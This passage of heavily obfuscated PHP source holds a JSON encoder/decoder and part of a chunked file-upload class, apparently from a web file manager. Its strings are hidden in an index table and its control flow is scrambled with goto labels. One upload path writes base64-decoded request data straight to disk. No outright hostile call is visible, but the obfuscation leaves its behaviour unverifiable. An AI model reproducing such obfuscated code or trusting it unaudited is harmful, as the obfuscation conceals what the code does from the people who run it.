ord($A‘ÉÁ‡‡ÌÜ[1]) >> 2) . chr(192 & ord($A‘ÉÁ‡‡ÌÜ[1]) << 6 | 127 & ord($A‘ÉÁ‡‡ÌÜ[2])); } return $DÀë“Âº[33]; } function encode($F’›ºä) { $cŞ¨Ş–ÃØ =& $_SERVER[¼€¼ˆ¦‚¡]; switch (gettype($F’›ºä)) { case $cŞ¨Ş–ÃØ[1601]: return $F’›ºä ? $cŞ¨Ş–ÃØ[1600] : $cŞ¨Ş–ÃØ[1602]; case $cŞ¨Ş–ÃØ[1940]: return $cŞ¨Ş–ÃØ[99]; case $cŞ¨Ş–ÃØ[303]: return (int) $F’›ºä; case $cŞ¨Ş–ÃØ[278]: case $cŞ¨Ş–ÃØ[277]: return (double) $F’›ºä; case $cŞ¨Ş–ÃØ[312]: $cÅ…›×© = $cŞ¨Ş–ÃØ[33]; $AÌŸó‹ôÇì = strlen($F’›ºä); for ($E¬ßÚ„„´ = 0; $E¬ßÚ„„´ < $AÌŸó‹ôÇì; ++$E¬ßÚ„„´) { $fÔÛø¹¢˜£ = ord($F’›ºä[$E¬ßÚ„„´]); switch (!0) { case $fÔÛø¹¢˜£ == 8: $cÅ…›×© .= $cŞ¨Ş–ÃØ[1941]; break; case $fÔÛø¹¢˜£ == 9: $cÅ…›×© .= $cŞ¨Ş–ÃØ[1577]; break; case $fÔÛø¹¢˜£ == 10: $cÅ…›×© .= $cŞ¨Ş–ÃØ[1575]; break; case $fÔÛø¹¢˜£ == 12: $cÅ…›×© .= $cŞ¨Ş–ÃØ[1942]; break; case $fÔÛø¹¢˜£ == 13: $cÅ…›×© .= $cŞ¨Ş–ÃØ[1576]; break; case $fÔÛø¹¢˜£ == 34: case $fÔÛø¹¢˜£ == 47: case $fÔÛø¹¢˜£ == 92: $cÅ…›×© .= $cŞ¨Ş–ÃØ[93] . $F’›ºä[$E¬ßÚ„„´]; break; case $fÔÛø¹¢˜£ >= 32 && $fÔÛø¹¢˜£ <= 127: $cÅ…›×© .= $F’›ºä[$E¬ßÚ„„´]; break; case ($fÔÛø¹¢˜£ & 224) == 192: $cä·ö®ğŒğ = pack($cŞ¨Ş–ÃØ[1943], $fÔÛø¹¢˜£, ord($F’›ºä[$E¬ßÚ„„´ + 1])); $E¬ßÚ„„´ += 1; $CŸ¦Ï£òƒ = $this->utf82utf16($cä·ö®ğŒğ); $cÅ…›×© .= sprintf($cŞ¨Ş–ÃØ[1944], bin2hex($CŸ¦Ï£òƒ)); break; case ($fÔÛø¹¢˜£ & 240) == 224: $cä·ö®ğŒğ = pack($cŞ¨Ş–ÃØ[1943], $fÔÛø¹¢˜£, ord($F’›ºä[$E¬ßÚ„„´ + 1]), ord($F’›ºä[$E¬ßÚ„„´ + 2])); $E¬ßÚ„„´ += 2; $CŸ¦Ï£òƒ = $this->utf82utf16($cä·ö®ğŒğ); $cÅ…›×© .= sprintf($cŞ¨Ş–ÃØ[1944], bin2hex($CŸ¦Ï£òƒ)); break; case ($fÔÛø¹¢˜£ & 248) == 240: $cä·ö®ğŒğ = pack($cŞ¨Ş–ÃØ[1943], $fÔÛø¹¢˜£, ord($F’›ºä[$E¬ßÚ„„´ + 1]), ord($F’›ºä[$E¬ßÚ„„´ + 2]), ord($F’›ºä[$E¬ßÚ„„´ + 3])); $E¬ßÚ„„´ += 3; $CŸ¦Ï£òƒ = $this->utf82utf16($cä·ö®ğŒğ); $cÅ…›×© .= sprintf($cŞ¨Ş–ÃØ[1944], bin2hex($CŸ¦Ï£òƒ)); break; case ($fÔÛø¹¢˜£ & 252) == 248: $cä·ö®ğŒğ = pack($cŞ¨Ş–ÃØ[1943], $fÔÛø¹¢˜£, ord($F’›ºä[$E¬ßÚ„„´ + 1]), ord($F’›ºä[$E¬ßÚ„„´ + 2]), ord($F’›ºä[$E¬ßÚ„„´ + 3]), ord($F’›ºä[$E¬ßÚ„„´ + 4])); $E¬ßÚ„„´ += 4; $CŸ¦Ï£òƒ = $this->utf82utf16($cä·ö®ğŒğ); $cÅ…›×© .= sprintf($cŞ¨Ş–ÃØ[1944], bin2hex($CŸ¦Ï£òƒ)); break; case ($fÔÛø¹¢˜£ & 254) == 252: $cä·ö®ğŒğ = pack($cŞ¨Ş–ÃØ[1943], $fÔÛø¹¢˜£, ord($F’›ºä[$E¬ßÚ„„´ + 1]), ord($F’›ºä[$E¬ßÚ„„´ + 2]), ord($F’›ºä[$E¬ßÚ„„´ + 3]), ord($F’›ºä[$E¬ßÚ„„´ + 4]), ord($F’›ºä[$E¬ßÚ„„´ + 5])); $E¬ßÚ„„´ += 5; $CŸ¦Ï£òƒ = $this->utf82utf16($cä·ö®ğŒğ); $cÅ…›×© .= sprintf($cŞ¨Ş–ÃØ[1944], bin2hex($CŸ¦Ï£òƒ)); break; } } return $cŞ¨Ş–ÃØ[113] . $cÅ…›×© . $cŞ¨Ş–ÃØ[113]; case $cŞ¨Ş–ÃØ[1945]: if (is_array($F’›ºä) && count($F’›ºä) && array_keys($F’›ºä) !== range(0, sizeof($F’›ºä) - 1)) { $cæ™¬áÌœ— = array_map(array($this, $cŞ¨Ş–ÃØ[1946]), array_keys($F’›ºä), array_values($F’›ºä)); foreach ($cæ™¬áÌœ— as $c¦Ä‘â”ß) { if (Services_JSON::isError($c¦Ä‘â”ß)) { return $c¦Ä‘â”ß; } } return $cŞ¨Ş–ÃØ[1068] . join($cŞ¨Ş–ÃØ[47], $cæ™¬áÌœ—) . $cŞ¨Ş–ÃØ[315]; } $AÁÚôÍÅ½õ = array_map(array($this, $cŞ¨Ş–ÃØ[1947]), $F’›ºä); foreach ($AÁÚôÍÅ½õ as $FÚ¶Á¨à’…) { if (Services_JSON::isError($FÚ¶Á¨à’…)) { return $FÚ¶Á¨à’…; } } return $cŞ¨Ş–ÃØ[157] . join($cŞ¨Ş–ÃØ[47], $AÁÚôÍÅ½õ) . $cŞ¨Ş–ÃØ[476]; case $cŞ¨Ş–ÃØ[1948]: $a¶æøÆØ = get_object_vars($F’›ºä); $cæ™¬áÌœ— = array_map(array($this, $cŞ¨Ş–ÃØ[1946]), array_keys($a¶æøÆØ), array_values($a¶æøÆØ)); foreach ($cæ™¬áÌœ— as $c¦Ä‘â”ß) { if (Services_JSON::isError($c¦Ä‘â”ß)) { return $c¦Ä‘â”ß; } } return $cŞ¨Ş–ÃØ[1068] . join($cŞ¨Ş–ÃØ[47], $cæ™¬áÌœ—) . $cŞ¨Ş–ÃØ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $cŞ¨Ş–ÃØ[99] : new Services_JSON_Error(gettype($F’›ºä) . $cŞ¨Ş–ÃØ[1949]); } } function name_value($b×£æË¦–À, $dËÇã…¶Õ) { $fêç„ÍÓÅ× = $this->encode($dËÇã…¶Õ); if (Services_JSON::isError($fêç„ÍÓÅ×)) { return $fêç„ÍÓÅ×; } return $this->encode(strval($b×£æË¦–À)) . $_SERVER[¼€¼ˆ¦‚¡][4] . $fêç„ÍÓÅ×; } function reduce_string($Cë“ÔæË„Ü) { $D§º­àùîµ =& $_SERVER[¼€¼ˆ¦‚¡]; $Cë“ÔæË„Ü = preg_replace(array($D§º­àùîµ[1950], $D§º­àùîµ[1951], $D§º­àùîµ[1952]), $D§º­àùîµ[33], $Cë“ÔæË„Ü); return trim($Cë“ÔæË„Ü); } function decode($eÔ®Ø°í›) { $D¡Ë´Ë•÷ =& $_SERVER[¼€¼ˆ¦‚¡]; $eÔ®Ø°í› = $this->reduce_string($eÔ®Ø°í›); switch (strtolower($eÔ®Ø°í›)) { case $D¡Ë´Ë•÷[1600]: return !0; case $D¡Ë´Ë•÷[1602]: return !1; case $D¡Ë´Ë•÷[99]: return null; default: $a¶«Ñ¯ƒÀ = array(); if (is_numeric($eÔ®Ø°í›)) { return (double) $eÔ®Ø°í› == (int) $eÔ®Ø°í› ? (int) $eÔ®Ø°í› : (double) $eÔ®Ø°í›; } elseif (preg_match($D¡Ë´Ë•÷[1953], $eÔ®Ø°í›, $a¶«Ñ¯ƒÀ) && $a¶«Ñ¯ƒÀ[1] == $a¶«Ñ¯ƒÀ[2]) { $cØÎéØ‘„¯ = substr($eÔ®Ø°í›, 0, 1); $bÔÃäÒÄ¦‚ = substr($eÔ®Ø°í›, 1, -1); $d÷´†Æ¡À¶ = $D¡Ë´Ë•÷[33]; $bœ¢«Ÿø† = strlen($bÔÃäÒÄ¦‚); for ($FÃ¯÷õª‚… = 0; $FÃ¯÷õª‚… < $bœ¢«Ÿø†; ++$FÃ¯÷õª‚…) { $d¨É½¶ôéæ = substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚…, 2); $Dì«™Õ¬» = ord($bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…]); switch (!0) { case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1941]: $d÷´†Æ¡À¶ .= chr(8); ++$FÃ¯÷õª‚…; break; case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1577]: $d÷´†Æ¡À¶ .= chr(9); ++$FÃ¯÷õª‚…; break; case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1575]: $d÷´†Æ¡À¶ .= chr(10); ++$FÃ¯÷õª‚…; break; case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1942]: $d÷´†Æ¡À¶ .= chr(12); ++$FÃ¯÷õª‚…; break; case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1576]: $d÷´†Æ¡À¶ .= chr(13); ++$FÃ¯÷õª‚…; break; case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1356]: case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1954]: case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1570]: case $d¨É½¶ôéæ == $D¡Ë´Ë•÷[1572]: if ($cØÎéØ‘„¯ == $D¡Ë´Ë•÷[113] && $d¨É½¶ôéæ != $D¡Ë´Ë•÷[1954] || $cØÎéØ‘„¯ == $D¡Ë´Ë•÷[55] && $d¨É½¶ôéæ != $D¡Ë´Ë•÷[1356]) { $d÷´†Æ¡À¶ .= $bÔÃäÒÄ¦‚[++$FÃ¯÷õª‚…]; } break; case preg_match($D¡Ë´Ë•÷[1955], substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚…, 6)): $dŠª©ğö’ = chr(hexdec(substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚… + 2, 2))) . chr(hexdec(substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚… + 4, 2))); $d÷´†Æ¡À¶ .= $this->utf162utf8($dŠª©ğö’); $FÃ¯÷õª‚… += 5; break; case $Dì«™Õ¬» >= 32 && $Dì«™Õ¬» <= 127: $d÷´†Æ¡À¶ .= $bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…]; break; case ($Dì«™Õ¬» & 224) == 192: $d÷´†Æ¡À¶ .= substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚…, 2); ++$FÃ¯÷õª‚…; break; case ($Dì«™Õ¬» & 240) == 224: $d÷´†Æ¡À¶ .= substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚…, 3); $FÃ¯÷õª‚… += 2; break; case ($Dì«™Õ¬» & 248) == 240: $d÷´†Æ¡À¶ .= substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚…, 4); $FÃ¯÷õª‚… += 3; break; case ($Dì«™Õ¬» & 252) == 248: $d÷´†Æ¡À¶ .= substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚…, 5); $FÃ¯÷õª‚… += 4; break; case ($Dì«™Õ¬» & 254) == 252: $d÷´†Æ¡À¶ .= substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚…, 6); $FÃ¯÷õª‚… += 5; break; } } return $d÷´†Æ¡À¶; } elseif (preg_match($D¡Ë´Ë•÷[1956], $eÔ®Ø°í›) || preg_match($D¡Ë´Ë•÷[1957], $eÔ®Ø°í›)) { goto A­Šº“ƒ; dİÓˆßÆÃÅ: $bÔÃäÒÄ¦‚ = $this->reduce_string($bÔÃäÒÄ¦‚); if ($bÔÃäÒÄ¦‚ == $D¡Ë´Ë•÷[33]) { if (reset($DÅ ïáèÑ) == SERVICES_JSON_IN_ARR) { return $Câ†ö‘Â; } else { return $cÓæ“Î‚ë; } } $bœ¢«Ÿø† = strlen($bÔÃäÒÄ¦‚); goto aëÁƒìµš; A­Šº“ƒ: if ($eÔ®Ø°í›[0] == $D¡Ë´Ë•÷[157]) { $DÅ ïáèÑ = array(SERVICES_JSON_IN_ARR); $Câ†ö‘Â = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DÅ ïáèÑ = array(SERVICES_JSON_IN_OBJ); $cÓæ“Î‚ë = array(); } else { $DÅ ïáèÑ = array(SERVICES_JSON_IN_OBJ); $cÓæ“Î‚ë = new stdClass(); } } array_push($DÅ ïáèÑ, array($D¡Ë´Ë•÷[1958] => SERVICES_JSON_SLICE, $D¡Ë´Ë•÷[263] => 0, $D¡Ë´Ë•÷[1959] => !1)); $bÔÃäÒÄ¦‚ = substr($eÔ®Ø°í›, 1, -1); goto dİÓˆßÆÃÅ; aëÁƒìµš: for ($FÃ¯÷õª‚… = 0; $FÃ¯÷õª‚… <= $bœ¢«Ÿø†; ++$FÃ¯÷õª‚…) { $eäë™˜Ã•à = end($DÅ ïáèÑ); $d¨É½¶ôéæ = substr($bÔÃäÒÄ¦‚, $FÃ¯÷õª‚…, 2); if ($FÃ¯÷õª‚… == $bœ¢«Ÿø† || $bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…] == $D¡Ë´Ë•÷[47] && $eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]] == SERVICES_JSON_SLICE) { $D¨ùÍÖ¨ = substr($bÔÃäÒÄ¦‚, $eäë™˜Ã•à[$D¡Ë´Ë•÷[263]], $FÃ¯÷õª‚… - $eäë™˜Ã•à[$D¡Ë´Ë•÷[263]]); array_push($DÅ ïáèÑ, array($D¡Ë´Ë•÷[1958] => SERVICES_JSON_SLICE, $D¡Ë´Ë•÷[263] => $FÃ¯÷õª‚… + 1, $D¡Ë´Ë•÷[1959] => !1)); if (reset($DÅ ïáèÑ) == SERVICES_JSON_IN_ARR) { array_push($Câ†ö‘Â, $this->decode($D¨ùÍÖ¨)); } elseif (reset($DÅ ïáèÑ) == SERVICES_JSON_IN_OBJ) { $EÏ‡»ÜŠ“ñ = array(); if (preg_match($D¡Ë´Ë•÷[1960], $D¨ùÍÖ¨, $EÏ‡»ÜŠ“ñ)) { $aÜÜ …†øë = $this->decode($EÏ‡»ÜŠ“ñ[1]); $a‘ŒêàÖÓ = $this->decode($EÏ‡»ÜŠ“ñ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $cÓæ“Î‚ë[$aÜÜ …†øë] = $a‘ŒêàÖÓ; } else { $cÓæ“Î‚ë->{$aÜÜ …†øë} = $a‘ŒêàÖÓ; } } elseif (preg_match($D¡Ë´Ë•÷[1961], $D¨ùÍÖ¨, $EÏ‡»ÜŠ“ñ)) { $aÜÜ …†øë = $EÏ‡»ÜŠ“ñ[1]; $a‘ŒêàÖÓ = $this->decode($EÏ‡»ÜŠ“ñ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $cÓæ“Î‚ë[$aÜÜ …†øë] = $a‘ŒêàÖÓ; } else { $cÓæ“Î‚ë->{$aÜÜ …†øë} = $a‘ŒêàÖÓ; } } } } elseif (($bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…] == $D¡Ë´Ë•÷[113] || $bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…] == $D¡Ë´Ë•÷[55]) && $eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]] != SERVICES_JSON_IN_STR) { array_push($DÅ ïáèÑ, array($D¡Ë´Ë•÷[1958] => SERVICES_JSON_IN_STR, $D¡Ë´Ë•÷[263] => $FÃ¯÷õª‚…, $D¡Ë´Ë•÷[1959] => $bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…])); } elseif ($bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…] == $eäë™˜Ã•à[$D¡Ë´Ë•÷[1959]] && $eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]] == SERVICES_JSON_IN_STR && (strlen(substr($bÔÃäÒÄ¦‚, 0, $FÃ¯÷õª‚…)) - strlen(rtrim(substr($bÔÃäÒÄ¦‚, 0, $FÃ¯÷õª‚…), $D¡Ë´Ë•÷[93]))) % 2 != 1) { array_pop($DÅ ïáèÑ); } elseif ($bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…] == $D¡Ë´Ë•÷[157] && in_array($eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DÅ ïáèÑ, array($D¡Ë´Ë•÷[1958] => SERVICES_JSON_IN_ARR, $D¡Ë´Ë•÷[263] => $FÃ¯÷õª‚…, $D¡Ë´Ë•÷[1959] => !1)); } elseif ($bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…] == $D¡Ë´Ë•÷[476] && $eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]] == SERVICES_JSON_IN_ARR) { array_pop($DÅ ïáèÑ); } elseif ($bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…] == $D¡Ë´Ë•÷[1068] && in_array($eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DÅ ïáèÑ, array($D¡Ë´Ë•÷[1958] => SERVICES_JSON_IN_OBJ, $D¡Ë´Ë•÷[263] => $FÃ¯÷õª‚…, $D¡Ë´Ë•÷[1959] => !1)); } elseif ($bÔÃäÒÄ¦‚[$FÃ¯÷õª‚…] == $D¡Ë´Ë•÷[315] && $eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]] == SERVICES_JSON_IN_OBJ) { array_pop($DÅ ïáèÑ); } elseif ($d¨É½¶ôéæ == $D¡Ë´Ë•÷[1962] && in_array($eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DÅ ïáèÑ, array($D¡Ë´Ë•÷[1958] => SERVICES_JSON_IN_CMT, $D¡Ë´Ë•÷[263] => $FÃ¯÷õª‚…, $D¡Ë´Ë•÷[1959] => !1)); $FÃ¯÷õª‚…++; } elseif ($d¨É½¶ôéæ == $D¡Ë´Ë•÷[1963] && $eäë™˜Ã•à[$D¡Ë´Ë•÷[1958]] == SERVICES_JSON_IN_CMT) { array_pop($DÅ ïáèÑ); $FÃ¯÷õª‚…++; for ($eùĞ®Ñ•× = $eäë™˜Ã•à[$D¡Ë´Ë•÷[263]]; $eùĞ®Ñ•× <= $FÃ¯÷õª‚…; ++$eùĞ®Ñ•×) { $bÔÃäÒÄ¦‚ = substr_replace($bÔÃäÒÄ¦‚, $D¡Ë´Ë•÷[50], $eùĞ®Ñ•×, 1); } } } if (reset($DÅ ïáèÑ) == SERVICES_JSON_IN_ARR) { return $Câ†ö‘Â; } elseif (reset($DÅ ïáèÑ) == SERVICES_JSON_IN_OBJ) { return $cÓæ“Î‚ë; } goto eÒ‡„’ö¸Ò; eÒ‡„’ö¸Ò: } } } function isError($Dç”Š½÷¼ß, $Fåˆá§©Å  = null) { $A³è‘Ğ‡÷„ =& $_SERVER[¼€¼ˆ¦‚¡]; if (class_exists($A³è‘Ğ‡÷„[1964])) { return PEAR::isError($Dç”Š½÷¼ß, $Fåˆá§©Å ); } elseif (is_object($Dç”Š½÷¼ß) && (get_class($Dç”Š½÷¼ß) == $A³è‘Ğ‡÷„[1965] || is_subclass_of($Dç”Š½÷¼ß, $A³è‘Ğ‡÷„[1965]))) { return !0; } return !1; } } if (class_exists($_SERVER[¼€¼ˆ¦‚¡][1966])) { class Services_JSON_Error extends PEAR_Error { function __construct($BÁÈö—èµÜ = "\x75\156\x6b\156\157\x77\x6e\x20\x65\x72\x72\157\x72", $Aù–ƒß£Àì = null, $dÂ ”‰¡Ù¯ = null, $Fğ¡´¶•÷® = null, $c›‘Çö¡©‚ = null) { parent::PEAR_Error($BÁÈö—èµÜ, $Aù–ƒß£Àì, $dÂ ”‰¡Ù¯, $Fğ¡´¶•÷®, $c›‘Çö¡©‚); } } } else { class Services_JSON_Error { function __construct($cğÍñšÀ˜¡ = "\165\156\153\x6e\x6f\x77\x6e\40\145\x72\162\157\x72", $eóš®¿çÜ´ = null, $fÅ¦×¿  = null, $Cä«›£Ğ¤É = null, $aæ‡ù‡Ÿ§Ø = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto fÍôáç„²; EÖÉ‡×‹£¹: $this->checkSize(); $this->tempPathInit(); goto F³ø¯ÙÌ³°; fÍôáç„²: $a´…Ø˜§Ò =& $_SERVER[¼€¼ˆ¦‚¡]; global $in; $this->in =& $in; goto eÖƒ¿Œ‚ñ; eÖƒ¿Œ‚ñ: if (!empty($_FILES)) { $CªˆŸ¹èØç = $_FILES[$a´…Ø˜§Ò[167]]; $this->uploadFile = $CªˆŸ¹èØç[$a´…Ø˜§Ò[1967]]; if (!$this->uploadFile && $CªˆŸ¹èØç[$a´…Ø˜§Ò[1219]] > 0) { show_json($this->errorInfo($CªˆŸ¹èØç[$a´…Ø˜§Ò[1219]]), !1); } } else { if (isset($in[$a´…Ø˜§Ò[386]])) { $this->uploadFile = isset($in[$a´…Ø˜§Ò[1968]]) ? $a´…Ø˜§Ò[1969] : $a´…Ø˜§Ò[1814]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto EÖÉ‡×‹£¹; F³ø¯ÙÌ³°: } public function upload() { goto DõÚÀ¯ğº; cöë°õ‰¢¡: $f÷ŸŠ‰‰Ş = $this->moveUploadedFile($B’æ—¼ãÒ’); if ($aè¯›øğ™Ñ > 0 && filesize($f÷ŸŠ‰‰Ş) == 0) { $this->showJson($Eî¡ñé¸í [1975], !1); } if (!$f÷ŸŠ‰‰Ş) { $this->showJson(LNG($Eî¡ñé¸í [1976]), !1); } goto E«Ä¤‹”É±; E±¯š’š­Ä: CacheLock::unlock($this->tempFile); return $this->tempFile; goto bƒ±ìªŸË; c‹”Õ£ˆ¤ê: @unlink($f÷ŸŠ‰‰Ş); if (!$dòˆ‘­­õğ) { $this->showJson($Eî¡ñé¸í [1978] . $f±¡ÁÌæ–§, !1); } $d‡„Û [$Eî¡ñé¸í [1979]] = $E¾’ËÀêËÄ; goto e…‹Óñ¾¥‰; dË®£¡« é: $B’æ—¼ãÒ’ = $this->tempFile . $Eî¡ñé¸í [1972] . $f±¡ÁÌæ–§; $aè¯›øğ™Ñ = isset($this->in[$Eî¡ñé¸í [520]]) ? intval($this->in[$Eî¡ñé¸í [520]]) : 0; $F…øö™Šİ = isset($this->in[$Eî¡ñé¸í [1973]]) ? intval($this->in[$Eî¡ñé¸í [1973]]) : 0; goto bß”‹—·”¯; aœ‹ïËïùÈ: $dòˆ‘­­õğ = $this->writeTo($f÷ŸŠ‰‰Ş, $DÁôÆœ¯¨, $this->tempFile); $Cø©÷’ˆÉ™ = IO::hashSimple($f÷ŸŠ‰‰Ş); $aè¯›øğ™Ñ = IO::size($f÷ŸŠ‰‰Ş); goto c‹”Õ£ˆ¤ê; DõÚÀ¯ğº: $Eî¡ñé¸í  =& $_SERVER[¼€¼ˆ¦‚¡]; $f±¡ÁÌæ–§ = isset($this->in[$Eî¡ñé¸í [1970]]) ? intval($this->in[$Eî¡ñé¸í [1970]]) : 0; $E¾’ËÀêËÄ = isset($this->in[$Eî¡ñé¸í [1971]]) ? intval($this->in[$Eî¡ñé¸í [1971]]) : 1; goto dË®£¡« é; f“¦È¼Æ›ˆ: CacheLock::lock($this->tempFile, 20); $d‡„Û  = $this->statusGet(); $this->initFileTemp(); goto cöë°õ‰¢¡; DµÙ«Ç³¿: ignore_timeout(); if (!$this->checkChunkHash($d‡„Û )) { $this->showJson($Eî¡ñé¸í [1984], !1); } $this->statusSet(!1); goto E±¯š’š­Ä; bß”‹—·”¯: if ($E¾’ËÀêËÄ > 1 && $F…øö™Šİ <= 0) { show_json($Eî¡ñé¸í [1974], !1); } if ($F…øö™Šİ > $aè¯›øğ™Ñ) { $E¾’ËÀêËÄ = 1; } if ($E¾’ËÀêËÄ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto f“¦È¼Æ›ˆ; E«Ä¤‹”É±: $dâµ½¶’ÆØ = $f±¡ÁÌæ–§ * $F…øö™Šİ; $DÁôÆœ¯¨ = @fopen($this->tempFile, $Eî¡ñé¸í [1977]); fseek($DÁôÆœ¯¨, $dâµ½¶’ÆØ); goto aœ‹ïËïùÈ; e…‹Óñ¾¥‰: $d‡„Û [$Eî¡ñé¸í [1980]][$Eî¡ñé¸í [1981] . $f±¡ÁÌæ–§] = array($Eî¡ñé¸í [1982] => $dâµ½¶’ÆØ, $Eî¡ñé¸í [1035] => $f±¡ÁÌæ–§, $Eî¡ñé¸í [77] => $aè¯›øğ™Ñ, $Eî¡ñé¸í [164] => $Cø©÷’ˆÉ™); $this->statusSet($d‡„Û ); if (count($d‡„Û [$Eî¡ñé¸í [1980]]) != $d‡„Û [$Eî¡ñé¸í [1979]]) { $this->showJson($Eî¡ñé¸í [1983] . $f±¡ÁÌæ–§, !0); } goto DµÙ«Ç³¿; bƒ±ìªŸË: } private function checkSize() { $EâàÖ‡Ê—ï =& $_SERVER[¼€¼ˆ¦‚¡]; if (phpBuild64() || $this->in[$EâàÖ‡Ê—ï[77]] < PHP_INT_MAX) { return; } show_json(LNG($EâàÖ‡Ê—ï[1985]), !1); } private function showJson($DİÚ¶ö‹ä…, $CØÁ‚˜²ÅÚ) { CacheLock::unlock($this->tempFile); if (!$CØÁ‚˜²ÅÚ) { return show_json($DİÚ¶ö‹ä…, $CØÁ‚˜²ÅÚ); } show_json($DİÚ¶ö‹ä…, $CØÁ‚˜²ÅÚ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto e¤±ø×¼ù ; FÀâ³‚¦¾Û: $this->tempFile = $b—²öŞ™¦½ . $cëº¦×åÒ¤[1988] . md5($E­š”ç³âƒ . $this->in[$cëº¦×åÒ¤[1532]]); goto fŠÖ‡Ò‰ÛØ; fğÁôè—ñ›: touch($b—²öŞ™¦½ . $cëº¦×åÒ¤[1986]); $E­š”ç³âƒ = isset($this->in[$cëº¦×åÒ¤[1987]]) ? $this->in[$cëº¦×åÒ¤[1987]] : !1; if (strlen($E­š”ç³âƒ) < 30) { $E­š”ç³âƒ = md5(USER_ID . $this->in[$cëº¦×åÒ¤[75]] . $this->fileName . $this->in[$cëº¦×åÒ¤[77]]); } goto FÀâ³‚¦¾Û; e¤±ø×¼ù : $cëº¦×åÒ¤ =& $_SERVER[¼€¼ˆ¦‚¡]; $b—²öŞ™¦½ = TEMP_FILES; @mk_dir($b—²öŞ™¦½); goto fğÁôè—ñ›; fŠÖ‡Ò‰ÛØ: } private function moveUploadedFile($c±¤‡ä„æ·) { $C††­áæÍ =& $_SERVER[¼€¼ˆ¦‚¡]; $D‘ì¶Ê®˜ï = $this->uploadFile; if ($D‘ì¶Ê®˜ï == $C††­áæÍ[1989]) { @file_put_contents($c±¤‡ä„æ·, base64_decode($_REQUEST[$C††­áæÍ[1990]])); } else { if ($D‘ì¶Ê®˜ï == $C††­áæÍ[1814]) { $AÒ°¯ö¨„” = @fopen($c±¤‡ä„æ·, $C††­áæÍ[1522]); $this->writeTo($D‘ì¶Ê®˜ï, $AÒ°¯ö¨„”, $c±¤‡ä„æ·); } else { if (!move_uploaded_file($D‘ì¶Ê®˜ï, $c±¤‡ä„æ·)) { return !1; } } } return $c±¤‡ä„æ·; } private function writeTo($FìœĞ…ñéŒ, $BÕ´ñÀƒá, $D„¿Ú³‚Ğï) { goto A«ùùÏ õ¾; Cä·ñ„á´: return !0; goto Eì†Šõºëé; A«ùùÏ õ¾: $AÛ¶á¾›À =& $_SERVER[¼€¼ˆ¦‚¡]; $d¯ôƒ…­×Â = $AÛ¶á¾›À[1991] . $D„¿Ú³‚Ğï; $Fõ‘Ûø˜™œ = CacheLock::lock($d¯ôƒ…­×Â, 1); goto eÑĞÑÙÔˆ¡; eÑĞÑÙÔˆ¡: $B‰˜âƒ¸£ğ = @fopen($FìœĞ…ñéŒ, $AÛ¶á¾›À[1521]); if (!$B‰˜âƒ¸£ğ || !$BÕ´ñÀƒá || !$Fõ‘Ûø˜™œ) { CacheLock::unlock($d¯ôƒ…­×Â); return !1; } while (!feof($B‰˜âƒ¸£ğ)) { fwrite($BÕ´ñÀƒá, fread($B‰˜âƒ¸£ğ, 1024 * 200)); } goto E¼âÒ‚…÷; E¼âÒ‚…÷: fclose($B‰˜âƒ¸£ğ); fclose($BÕ´ñÀƒá); CacheLock::unlock($d¯ôƒ…­×Â); goto Cä·ñ„á´; Eì†Šõºëé: } private function statusGet() { goto a»¯•²ì­Ä; a»¯•²ì­Ä: $aœÆ™¶ÎÇÜ =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_array($this->statusData)) { return $this->statusData; } $aùñ±±ßî = $this->tempFile . $aœÆ™¶ÎÇÜ[1992]; goto Cğ¦º°‡—; Cğ¦º°‡—: $e¬«±™° = !1; if (file_exists($aùñ±±ßî)) { $e¬«±™° = @file_get_contents($aùñ±±ßî); } if ($e¬«±™°) { $this->statusData = json_decode($e¬«±™°, !0); } goto d¬–‘ß‹Ñé; d¬–‘ß‹Ñé: if (!$this->statusData) { 